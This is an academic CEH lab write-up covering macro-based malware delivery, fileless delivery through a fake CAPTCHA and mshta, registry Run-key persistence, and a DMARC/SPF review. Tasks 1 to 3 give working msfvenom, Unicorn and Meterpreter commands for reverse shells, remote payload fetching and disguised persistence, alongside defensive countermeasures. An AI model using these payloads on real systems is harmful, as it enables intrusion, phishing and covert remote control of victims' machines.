# Week 6 CTF Challenge — Malware Delivery, Persistence & Email Security

> **Disclaimer:** All tasks performed exclusively in isolated VirtualBox lab environment
> (Host-Only network) as part of academic CEH coursework. No real systems targeted.

---

## Lab Overview

| Detail | Info |
|--------|------|
| Date | April 03, 2026 |
| Environment | VirtualBox — Host-Only Network |
| Attacker | Kali Linux (192.168.88.185) |
| Target | Windows 10 (192.168.88.216) |
| Tools | Unicorn, msfvenom, Metasploit, Apache2, dmarcian |

---

## Task 1 — Macro-Based Malware Delivery (.xlsm)

### Objective
Demonstrate payload delivery through a macro-enabled Excel file to establish a reverse
Meterpreter connection in a controlled lab environment.

### Tools Used
- Kali Linux
- Unicorn Tool (PowerShell Payload Generator)
- Metasploit Framework
- Microsoft Excel (.xlsm)

### Attack Chain

**Step 1 — Payload Generation (Unicorn)**
```bash
cd /opt/unicorn
python unicorn.py windows/meterpreter/reverse_tcp 192.168.88.185 2222 macro
```
Unicorn generated an obfuscated PowerShell payload exported to `powershell_attack.txt`.

**Step 2 — Excel Macro File Creation**
- Microsoft Excel launched on target-side
- New workbook created and saved as `.xlsm` (Macro-Enabled Workbook)
- File named: `ATTENDANCE SHEET.xlsm`

**Step 3 — Macro Development (VBA)**
- Developer tab enabled
- Visual Basic Editor opened
- `workbook_Open()` macro created — executes automatically on file open
- Obfuscated PowerShell payload embedded in VBA string variable

**Step 4 — Listener Configuration**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.88.185
set LPORT 2222
run
```

**Step 5 — Payload Execution**
- Excel file opened on target machine
- User clicked "Enable Content" (macro enabled)
- Embedded macro auto-executed PowerShell payload

### Result
```
Meterpreter session 1 opened
(192.168.88.185:2222 → 192.168.88.216:55940)
OS: Windows 10 22H2+ (Build 19045) x64
```

### Concepts Learned
- VBA macro weaponization via Unicorn
- PowerShell payload obfuscation
- Document-based phishing delivery
- Meterpreter reverse shell establishment

### Defensive Countermeasures
- Disable macros by default in Office Group Policy
- Enable Protected View for downloaded documents
- Deploy email filtering to block `.xlsm` attachments
- User awareness training — never enable macros from unknown sources

---

## Task 2 — Fileless Malware via Fake CAPTCHA (Social Engineering)

### Objective
Deliver fileless malware using social engineering — fake "I'm not a robot" CAPTCHA page
triggering `mshta` to execute HTA payload in memory (no file written to disk).

### Tools Used
- msfvenom, Metasploit, Apache2, mshta (Windows built-in)

### Attack Chain

**Step 1 — HTA Payload Generation**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.88.185 LPORT=2222 \
  -f hta-psh -o Login.hta
```
Output: `Login.hta` — 7452 bytes

**Step 2 — Web Server Setup**
```bash
sudo mv Login.hta /var/www/html/
service apache2 start
```

**Step 3 — Listener Setup**
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.88.185
set LPORT 2222
run
```

**Step 4 — Fake CAPTCHA Page**

HTML button created to trigger mshta:
```html
<button onclick="location.href=
'mshta http://192.168.88.185/Login.hta'">
  I'm not a robot
</button>
```

Social engineering flow:
- Fake verification page displayed
- User prompted: Press Win+R → Ctrl+V → Enter
- mshta fetches and executes HTA payload in memory

**Step 5 — Attack Execution**
- Victim clicks "I'm not a robot"
- mshta.exe executes payload — no file written to disk
- Reverse connection established

### Result
```
Meterpreter session 1 opened
(192.168.88.185:2222 → 192.168.88.216:54732)
sysinfo: Windows 10 22H2+ x64
```

### Concepts Learned
- Fileless malware execution via LOLBins (mshta)
- HTA payload delivery through web server
- Social engineering CAPTCHA bypass technique
- Living-off-the-land attack methodology

### Defensive Countermeasures
- Block mshta.exe execution via AppLocker/WDAC
- Web filtering to block HTA file downloads
- Disable or restrict mshta.exe in enterprise environments
- User awareness — never run commands from websites

---

## Task 3 — Post-Exploitation Persistence Attack

### Objective
After gaining Meterpreter access, deploy persistence by uploading payload to Windows
Temp folder and adding Windows Registry Run key entry.

### Tools Used
- msfvenom, Metasploit, Meterpreter, Windows Registry

### Attack Chain

**Step 1 — Initial Payload**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.88.185 LPORT=4444 \
  -f exe -o task3_payload.exe
```

**Step 2 — Initial Access Confirmed**
```
Meterpreter session opened
getuid → Server username: DESKTOP-LOUOQKP\Adeel
```

**Step 3 — Persistence Payload (Separate Port)**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.88.185 LPORT=5555 \
  -f exe -o persistent.exe
```

**Step 4 — Upload to Temp Folder**
```bash
meterpreter > upload /home/kali/persistent.exe \
  C:\\Windows\\Temp\\svchost.exe
```
Result: 7.00 KiB uploaded — disguised as `svchost.exe`

**Step 5 — Registry Run Key Entry**
```bash
meterpreter > reg setval \
  -k "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
  -v "WindowsSecurityUpdate" \
  -d "C:\\Windows\\Temp\\svchost.exe"
```
Result: `Successfully set WindowsSecurityUpdate of REG_SZ`

**Step 6 — Verification**
Registry entry confirmed in:
`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

| Name | Type | Data |
|------|------|------|
| WindowsSecurityUpdate | REG_SZ | C:\Windows\Temp\svchost.exe |

Payload executes automatically on every user login — persistence achieved.

### Concepts Learned
- Post-exploitation persistence methodology
- Windows Registry Run key abuse
- Payload disguising (svchost.exe naming)
- Maintaining access across system reboots

### Defensive Countermeasures
- Monitor HKCU\...\Run registry keys for unauthorized entries
- Deploy EDR solutions to detect suspicious Registry modifications
- Restrict write access to Windows\Temp for non-admin users
- Implement application whitelisting — block unsigned executables

---

## Task 4 — DMARC/SPF/DKIM Analysis & Email Security Assessment

### Objective
Analyze email security DNS records for `protonmail.com` and assess spoofing risk.

### Tool Used
- dmarcian.com DMARC Lookup

### DNS Records Analysis

**DMARC Record**
```
v=DMARC1; p=quarantine; fo=1; aspf=s; adkim=s;
```

| Field | Value | Assessment |
|-------|-------|-----------|
| Policy | p=quarantine | ⚠️ Medium risk — should be p=reject |
| aspf | s (strict) | ✅ Strict SPF alignment |
| adkim | s (strict) | ✅ Strict DKIM alignment |

**SPF Record**
```
v=spf1 include:_spf.protonmail.ch ~all
```

| Field | Value | Assessment |
|-------|-------|-----------|
| include | _spf.protonmail.ch | ✅ Authorized servers defined |
| ~all | Soft fail | ⚠️ Should be -all (hard fail) |

**Spoofing Risk Table**

| Policy | Risk Level |
|--------|-----------|
| p=none | 🔴 High — fully vulnerable |
| p=quarantine | 🟡 Medium — goes to spam |
| p=reject | 🟢 Low — protected |

### Key Finding
Protonmail uses `p=quarantine` — spoofed emails would land in spam, not inbox.
Complete protection requires `p=reject` + `-all` SPF hard fail.

### Concepts Learned
- DMARC, SPF, DKIM record structure and analysis
- Email spoofing risk assessment methodology
- DNS-based email security controls
- Difference between quarantine vs reject policies

### Defensive Recommendations
- Upgrade DMARC policy from `p=quarantine` to `p=reject`
- Change SPF from `~all` (soft fail) to `-all` (hard fail)
- Enable DMARC reporting (rua/ruf tags) for monitoring
- Regularly audit authorized sending sources

---

## Skills Demonstrated — Week 6

| Skill | Tool/Technique |
|-------|---------------|
| Macro-based delivery | Unicorn, VBA, Excel .xlsm |
| Fileless malware | mshta, HTA payload, LOLBins |
| Social engineering | Fake CAPTCHA, user manipulation |
| Post-exploitation | Meterpreter upload, persistence |
| Registry persistence | HKCU Run key modification |
| Email security analysis | DMARC, SPF, DKIM assessment |
| Payload disguising | svchost.exe naming technique |

---

*Academic Lab | CEH Coursework — Week 6 | Muhammad Adeel Tariq*
*All work performed in isolated VirtualBox environment*
